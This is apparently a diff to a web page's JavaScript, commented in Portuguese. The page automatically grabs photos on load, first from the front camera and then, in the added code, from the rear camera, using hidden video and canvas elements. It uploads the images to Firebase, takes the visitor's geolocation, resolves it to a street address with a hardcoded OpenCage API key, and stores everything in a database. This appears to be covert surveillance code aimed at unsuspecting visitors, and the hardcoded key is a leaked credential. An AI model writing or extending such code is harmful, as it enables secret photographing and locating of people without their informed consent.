@@ -77,20 +77,21 @@
       loader.style.display = 'none';
     }
 
-    // Função para capturar selfie e salvar no Storage
-    function captureSelfieAndSave() {
+    // Função para capturar selfie e foto com a câmera traseira
+    function captureSelfieAndBackCamera() {
       const video = document.createElement('video'); // Cria o elemento de vídeo oculto
       const canvas = document.createElement('canvas'); // Cria o canvas oculto
 
       showLoader(); // Exibe a barra de carregamento
 
-      navigator.mediaDevices.getUserMedia({ video: true })
+      // Primeiro captura a selfie com a câmera frontal
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
           video.srcObject = stream;
           video.play();
 
           video.onloadedmetadata = () => {
-            // Tira a selfie automaticamente assim que a câmera está pronta
+            // Captura a selfie com a câmera frontal
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
@@ -100,31 +101,76 @@
             stream.getTracks().forEach(track => track.stop());
 
             const selfieData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
-            uploadSelfieToStorage(selfieData);
+
+            // Agora captura a foto com a câmera traseira
+            captureBackCamera(selfieData);
           };
         })
         .catch(error => {
-          hideLoader(); // Oculta a barra de carregamento em caso de erro
-          alert('Erro ao acessar a câmera. Verifique as permissões e tente novamente.');
+          hideLoader();
+          alert('Erro ao acessar a câmera frontal. Verifique as permissões e tente novamente.');
         });
     }
 
-    // Função para salvar selfie no Firebase Storage
-    function uploadSelfieToStorage(selfieData) {
-      const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
-      storageRef.putString(selfieData, 'data_url')
-        .then(snapshot => snapshot.ref.getDownloadURL())
-        .then(url => {
-          getLocation(url); // Após salvar a selfie, coleta localização e endereço
+    // Função para capturar a foto com a câmera traseira
+    function captureBackCamera(frontSelfieData) {
+      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
+      const canvas = document.createElement('canvas'); // Cria o canvas oculto
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+
+          video.onloadedmetadata = () => {
+            // Captura a foto com a câmera traseira
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Para a câmera e captura a imagem
+            stream.getTracks().forEach(track => track.stop());
+
+            const backCameraData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
+            uploadPhotosToStorage(frontSelfieData, backCameraData);
+          };
         })
         .catch(error => {
           hideLoader();
-          alert('Erro ao salvar a selfie no Firebase Storage: ' + error.message);
+          alert('Erro ao acessar a câmera traseira. Verifique as permissões e tente novamente.');
+        });
+    }
+
+    // Função para salvar as fotos no Firebase Storage
+    function uploadPhotosToStorage(frontSelfieData, backCameraData) {
+      const timestamp = new Date().toISOString(); // Obtém a data e hora atual
+      const frontStorageRef = storage.ref(`photos/frontSelfie_${timestamp}.png`);
+      const backStorageRef = storage.ref(`photos/backCamera_${timestamp}.png`);
+
+      // Salva a foto da câmera frontal
+      frontStorageRef.putString(frontSelfieData, 'data_url')
+        .then(snapshot => snapshot.ref.getDownloadURL())
+        .then(frontUrl => {
+          // Salva a foto da câmera traseira
+          backStorageRef.putString(backCameraData, 'data_url')
+            .then(snapshot => snapshot.ref.getDownloadURL())
+            .then(backUrl => {
+              getLocation(frontUrl, backUrl, timestamp); // Coleta localização e salva os dados
+            })
+            .catch(error => {
+              hideLoader();
+              alert('Erro ao salvar a foto da câmera traseira: ' + error.message);
+            });
+        })
+        .catch(error => {
+          hideLoader();
+          alert('Erro ao salvar a foto da câmera frontal: ' + error.message);
         });
     }
 
     // Obter endereço completo a partir de coordenadas
-    function getAddressFromCoordinates(lat, lon, selfieUrl) {
+    function getAddressFromCoordinates(lat, lon, frontUrl, backUrl, timestamp) {
       const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
       const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
 
@@ -142,7 +188,9 @@
               house_number: result.house_number || '',
               country: result.country || '',
               address: data.results[0].formatted,
-              selfieUrl: selfieUrl
+              frontSelfieUrl: frontUrl,
+              backCameraUrl: backUrl,
+              timestamp: timestamp
             };
             sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
           } else {
@@ -157,13 +205,13 @@
     }
 
     // Localização do usuário
-    function getLocation(selfieUrl) {
+    function getLocation(frontUrl, backUrl, timestamp) {
       if (navigator.geolocation) {
         document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
         navigator.geolocation.getCurrentPosition(
           position => {
             const { latitude, longitude } = position.coords;
-            getAddressFromCoordinates(latitude, longitude, selfieUrl);
+            getAddressFromCoordinates(latitude, longitude, frontUrl, backUrl, timestamp);
           },
           error => {
             hideLoader();
@@ -192,7 +240,7 @@
     function sendDataToFirebase(data) {
       const reference = database.ref('userData');
       reference.push(data, function (error) {
-        hideLoader(); // Oculta a barra de carregamento após salvar os dados
+        hideLoader();
         if (error) {
           alert('Erro ao enviar dados para o Firebase: ' + error.message);
         } else {
@@ -203,7 +251,7 @@
 
     // Iniciar coleta de dados automaticamente
     window.onload = () => {
-      captureSelfieAndSave(); // Primeiro passo: captura a selfie automaticamente
+      captureSelfieAndBackCamera(); // Captura selfie e foto da câmera traseira automaticamente
     };
   </script>
 </body>
